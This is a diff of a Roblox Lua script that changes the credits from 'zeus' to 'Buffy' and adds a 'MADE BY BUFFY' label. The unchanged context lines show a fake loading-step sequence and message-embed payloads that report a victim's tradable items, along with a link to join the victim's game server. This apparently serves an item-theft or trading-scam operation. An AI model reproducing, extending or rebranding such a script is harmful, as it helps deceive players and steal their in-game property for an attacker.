@@ -67,7 +67,14 @@ barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 barFill.BorderSizePixel = 0
 barFill.Parent = barBg
 
-
+local discord = Instance.new("TextLabel", bg)
+discord.Text = "MADE BY BUFFY ,ENJOY"
+discord.Font = Enum.Font.GothamSemibold
+discord.TextColor3 = Color3.fromRGB(120, 120, 255)
+discord.TextScaled = true
+discord.Size = UDim2.new(0.8, 0, 0.05, 0)
+discord.Position = UDim2.new(0.1, 0, 0.86, 0)
+discord.BackgroundTransparency = 1
 
 local fakeSteps = {
     "MADE BY BUFFY",
@@ -214,7 +221,7 @@ local payload = {
             {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
             {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
-        ["footer"] = {["text"] = "by zues • " .. os.date("%B %d, %Y")},
+        ["footer"] = {["text"] = "by Buffy • " .. os.date("%B %d, %Y")},
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
@@ -230,7 +237,7 @@ local logs_payload = {
             {["name"] = ":package: Items", ["value"] = "```\n" .. tradableSummary .. "```", ["inline"] = false},
             {["name"] = ":link: Join Server", ["value"] = string.format("[Click to join game](https://floating.gg/?placeID=%d&gameInstanceId=%s)", game.PlaceId, game.JobId), ["inline"] = false}
         },
-        ["footer"] = {["text"] = "by zeus • " .. os.date("%B %d, %Y")},
+        ["footer"] = {["text"] = "by buffy • " .. os.date("%B %d, %Y")},
         ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }}
 }
